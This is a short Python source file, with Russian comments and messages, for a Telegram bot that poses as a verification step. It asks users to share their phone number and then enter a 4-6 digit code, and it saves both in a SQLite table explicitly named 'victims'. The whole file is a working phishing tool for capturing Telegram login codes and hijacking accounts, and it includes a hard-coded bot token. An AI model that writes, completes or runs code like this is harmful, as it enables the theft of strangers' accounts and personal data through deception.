import os
import sqlite3
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiohttp import TCPConnector
from aiogram.client.session.aiohttp import AiohttpSession

# ТВОЙ ТОКЕН
BOT_TOKEN = '7880089024:AAFmWOsYNjIH1ca88Cc6mvCjyPl_uf6BEaw'
DB_PATH = os.path.join(os.path.expanduser("~"), "Desktop", "victims.db")

# Настраиваем коннектор так, чтобы он не конфликтовал с системными настройками
connector = TCPConnector(force_close=True, enable_cleanup_closed=True)
session = AiohttpSession(connector=connector)

# Инициализация с нашей «тихой» сессией
bot = Bot(token=BOT_TOKEN, session=session)
dp = Dispatcher()

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims 
                      (user_id INTEGER PRIMARY KEY, phone TEXT, code TEXT)''')
    conn.commit()
    conn.close()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = types.ReplyKeyboardMarkup(
        keyboard=[[types.KeyboardButton(text="Поделиться контактом", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )
    await message.answer("Привет! Пройди верификацию.", reply_markup=kb)

@dp.message(F.contact)
async def handle_contact(message: types.Message):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO victims (user_id, phone) VALUES (?, ?)",
                   (message.from_user.id, message.contact.phone_number))
    conn.commit()
    conn.close()
    await message.answer("Принято. Введите код:")

@dp.message(F.text.regexp(r'^\d{4,6}$'))
async def handle_code(message: types.Message):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("UPDATE victims SET code = ? WHERE user_id = ?", (message.text, message.from_user.id))
    conn.commit()
    conn.close()
    await message.answer("Данные приняты.")

async def main():
    init_db()
    print("Бот запущен. Если GoodbyeDPI активен, ошибок не будет.")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())